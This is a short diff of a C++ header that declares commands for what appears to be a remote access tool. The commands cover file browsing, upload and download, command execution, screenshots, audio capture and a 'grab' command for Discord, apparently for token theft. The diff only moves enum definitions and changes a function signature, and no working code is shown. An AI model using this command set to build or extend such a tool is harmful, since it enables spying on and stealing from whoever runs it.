@@ -1,25 +1,10 @@
 #ifndef COMMANDS_H
 #define COMMANDS_H
 
+#include <vector>
 #include "simplecommand.h"
 #include "controller.h"
-#include <vector>
-
-enum class NavigateCommand {
-    ls, cd, pwd, rm
-};
-
-enum class AudioCommand {
-    start, stop, list
-};
-
-enum class DiscordCommand {
-    check, grab
-};
-
-enum class ShowoffCommand {
-    gethacked
-};
+#include "commandtypes.h"
 
 // navigation
 int navigation(Controller& ctrl, unsigned char cmd, const std::string path);
@@ -27,7 +12,7 @@ int navigation(Controller& ctrl, unsigned char cmd, const std::string path);
 int downloadFile(Controller& ctrl, const std::string path);
 int uploadFile(Controller& ctrl, const std::string path, std::vector<char> data);
 // exec
-int exec(Controller& ctrl, const std::string cmd, const std::vector<std::string> args, bool wait);
+int exec(Controller& ctrl, std::string cmd, bool wait);
 // screen
 int screenshot(Controller& ctrl);
 // audio
